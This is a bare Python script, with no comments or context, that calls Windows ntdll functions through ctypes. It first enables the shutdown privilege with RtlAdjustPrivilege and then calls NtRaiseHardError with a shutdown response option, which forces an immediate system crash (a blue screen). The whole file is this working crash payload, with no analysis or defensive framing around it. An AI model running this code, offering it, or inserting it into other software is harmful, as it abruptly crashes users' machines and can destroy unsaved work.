import ctypes

nullptr = ctypes.POINTER(ctypes.c_int)()

ctypes.windll.ntdll.RtlAdjustPrivilege(
    ctypes.c_uint(19),
    ctypes.c_uint(1),
    ctypes.c_uint(0),
    ctypes.byref(ctypes.c_int())
)

ctypes.windll.ntdll.NtRaiseHardError(
    ctypes.c_ulong(0xC000007B),
    ctypes.c_ulong(0),
    nullptr,
    nullptr,
    ctypes.c_uint(6),
    ctypes.byref(ctypes.c_uint())
)
